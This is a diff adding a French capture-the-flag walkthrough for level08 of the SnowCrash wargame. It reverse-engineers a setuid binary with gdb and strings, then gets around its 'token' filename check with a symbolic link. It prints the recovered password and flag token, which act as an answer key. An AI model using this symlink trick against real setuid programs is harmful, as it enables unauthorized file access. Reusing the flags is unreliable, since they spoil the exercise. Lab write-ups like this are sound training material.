@@ -1,0 +1,51 @@
+on a deux fichier un token auquel on n'a pas array_change_key_case
+et un exécutable
+
+quand on passe token a l'exécutable on a un message d'erreur indiquant qu'on a pas acces a token
+
+en faisant un cat sur level08
+on obitent quelque bride d'infos 
+	%s [file to read]
+	tokenYou may not access '%s'
+	Unable to open %sUnable to read fd %d
+
+aucune info importante dans le env ni dans les dossiers disponible
+rien avec ls -AR
+
+je test la commande gdb sur level8 et avec disas main je découvre que level08 compare des strings
+
+je découvre ensuite la commande strings level08
+level08@SnowCrash:~$ strings level08 
+...
+printf
+strstr
+read
+open
+[^_]
+%s [file to read]
+token
+You may not access '%s'
+Unable to open %s
+Unable to read fd %d
+...
+
+on voit qu'il y a une chaine token hardcoder dans le programme et qu'il utilise strstr
+juste apres token on vois qu'il fait met you may not access
+
+de plus j'ai tester de faire ./level08 level08 et ca a marche
+
+il faudrait faire passer token mais avec un nom différent on a pas la main pour le rename mais on a des liens symbolique
+
+level08@SnowCrash:~$ ln -s ~/token /tmp/flag
+level08@SnowCrash:~$ ./level08 /tmp/flag
+quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su level09
+Password: 
+su: Authentication failure
+le mot de passe ne marche pas sur level09
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
